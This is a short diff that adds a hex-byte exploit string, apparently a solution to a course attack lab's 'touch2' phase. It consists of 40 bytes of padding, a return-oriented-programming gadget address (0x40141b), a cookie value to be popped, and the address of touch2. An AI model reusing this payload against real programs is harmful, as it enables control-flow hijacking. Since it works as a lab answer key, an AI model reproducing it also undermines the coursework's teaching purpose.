@@ -1,0 +1,7 @@
+30 31 32 33 34 35 36 37 38 39   /* 40 characters padding */
+30 31 32 33 34 35 36 37 38 39 
+30 31 32 33 34 35 36 37 38 39 
+30 31 32 33 bf fa 97 b9 59 c3 
+1b 14 40 00 00 00 00 00         /* return rop: 0x40141b */
+fa 97 b9 59 00 00 00 00         /* the cookie value to be poped */
+ec 17 40 00 00 00 00 00 0a      /* return addr touch2 */
